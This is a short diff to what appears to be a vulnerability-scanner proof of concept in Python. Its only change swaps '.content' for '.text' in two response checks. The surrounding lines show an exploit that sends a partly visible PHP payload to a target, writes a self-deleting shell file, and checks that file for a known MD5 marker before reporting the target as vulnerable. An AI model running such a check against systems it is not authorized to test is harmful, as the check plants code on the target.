@@ -63,10 +63,10 @@ class Poc(ABPoc):
                        "unlink(__FILE__);?>')}") % (hash_num, rand_num)
 
             requests.get(first_url + '?' + payload)
-            if hash_num in requests.get(secend_url).content:
+            if hash_num in requests.get(secend_url).text:
                 print('[*] Checking')
 
-            if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).content:
+            if '202cb962ac59075b964b07152d234b70' in requests.get(shell_url).text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
